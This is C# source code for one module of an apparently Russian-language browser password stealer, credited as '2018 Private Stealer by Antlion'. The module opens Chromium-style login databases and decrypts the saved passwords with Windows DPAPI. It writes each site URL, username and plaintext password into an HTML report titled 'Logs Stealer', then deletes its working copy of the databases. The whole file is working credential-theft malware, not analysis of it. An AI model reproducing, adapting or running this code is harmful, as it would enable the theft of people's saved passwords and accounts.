namespace DomaNet.Browsers
{
    using System.Data;
    using System.Data.SQLite;
    using System.IO;
    using System.Security.Cryptography;
    using System.Text;

    public class GetEnginePassword : SearchLogin
    {
        protected static byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            using (var stream = new MemoryStream())
            {
                long bytesRead;
                long fieldOffset = 0;
                var buffer = new byte[(0x2 * 0x400)];
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }

        private static StringBuilder _LogEngine = new StringBuilder();

        static int Fragment = 1;
        private static int GetScount => Fragment++;

        public static void All(string PathSave)
        {
            #region Table

            _LogEngine.AppendLine("<!DOCTYPE html>");
            _LogEngine.AppendLine("<html lang=\"en\">");
            _LogEngine.AppendLine("<head>");
            _LogEngine.AppendLine("<meta charset=\"UTF-8\" />");
            _LogEngine.AppendLine("<title>Logs Stealer</title>");
            _LogEngine.AppendLine("<style>");
            _LogEngine.AppendLine(".link{display:block; width:300px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; ext-decoration: none; outline:none;}");
            _LogEngine.AppendLine(".link{text-decoration: none; color:#85AB70}");
            _LogEngine.AppendLine(".link:hover{text-decoration: underline; color:green}");
            _LogEngine.AppendLine(".link:active{color:blue}");
            _LogEngine.AppendLine("</style>");
            _LogEngine.AppendLine("<link rel=\"shortcut icon\" href=http://s1.iconbird.com/ico/2013/2/634/w50h50139292026819.png");
            _LogEngine.AppendLine("</head>");
            _LogEngine.AppendLine("<body style=\"width:100%; height:100%; margin: 0; background: url(http://www.wallpapers4u.org/wp-content/uploads/dark_background_line_surface_65896_1920x1080.jpg) #191919\">");
            _LogEngine.AppendLine("<center><h1 style=\"color:#85AB70; margin:50px 0\">Логи со стиллера</h1><center><a href=\"#\"></a><table style=\"width: 1000px; margin:50px auto\"><tr>");
            _LogEngine.AppendLine("<td style=\"width: 33.3%; height: 35px; color:#B6EEF7; border:2px solid #707070\"><center>#N</center></td>");
            _LogEngine.AppendLine("<td style=\"width: 33.3%; height: 35px; color:#B6EEF7; border:2px solid #707070\"><center>Url</center></td>");
            _LogEngine.AppendLine("<td style=\"width: 33.3%; height: 35px; color:#B6EEF7; border:2px solid #707070\"><center>Login</center></td>");
            _LogEngine.AppendLine("<td style=\"width: 33.3%; height: 35px; color:#B6EEF7; border:2px solid #707070\"><center>Password</center></td></tr>");

            #endregion

            #region Get Password

            for (var i = 0; i < GetLogins.Count; i++)
            {
                try
                {
                    using (var Connect = new SQLiteConnection($"Data Source={GetLogins[i]};Version=3;New=False;Compress=True;"))
                    {
                        using (var ComText = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", Connect))
                        {
                            Connect.Open();
                            ComText.CommandType = CommandType.Text;
                            using (var reader = ComText.ExecuteReader())
                            {
                                if (reader.HasRows)
                                {
                                    while (reader.Read())
                                    {
                                        var Url = reader.GetString(0);
                                        var Login = reader.GetString(1);
                                        var Password = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 0x2), null, DataProtectionScope.LocalMachine));
                                        if (!string.IsNullOrEmpty(Url) && !string.IsNullOrEmpty(Login) && !string.IsNullOrEmpty(Password))
                                        {
                                            _LogEngine.AppendFormat("<td style=\"color:#85AB70; width:33.3%; border:2px solid #707070; text-align: center\"><div style=\"height: 31px;line-height: 31px\"><a title=\"Порядковый номер: {0}.\"<center>{0}</center></p></div></td>", GetScount);
                                            _LogEngine.AppendFormat("<td style=\"width:33.3%; border:2px solid #707070; text-align: center\"><div style=\"height: 31px;line-height: 31px\"><a title=\"Кликните по ссылке чтобы перейти на сайт.\"<a href='{0}' class=\"link\" target='_blank'<p align=\"center\"><center>{0}</a></p></div></td>", Url);
                                            _LogEngine.AppendFormat("<td style=\"color:#85AB70; width:33.3%; border:2px solid #707070; text-align: center\"><div style=\"height: 31px;line-height: 31px\"><a title=\"Логин пользователя.\"<center>{0}</a></p></div></td>", Login);
                                            _LogEngine.AppendFormat("<td style=\"color:#85AB70; width:33.3%; border:2px solid #707070; text-align: center\"><div style=\"height: 31px;line-height: 31px\"><a title=\"Пароль пользователя.\"<center>{0}</a></p></div></td></tr>", Password);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                catch (SQLiteException) { }
            }

            #endregion

            #region End Table

            _LogEngine.AppendLine("<center><p style=\"color:#B6EEF7; margin:50px\">2018 Private Stealer by Antlion<center></a><table style=\"width:10px; margin:50px auto\"></center></p></tr>");
            _LogEngine.AppendLine("</table>");

            File.AppendAllText(PathSave, _LogEngine.ToString());
            GetLogins.Clear();

            #endregion

            #region Delete Secure Logins Directory

            try
            {
                Directory.Delete(Path.Combine(GetDirPath.User_Name, "Logins"), true);
            }
            catch (DirectoryNotFoundException) { }
            catch (IOException) { }

            #endregion
        }
    }
}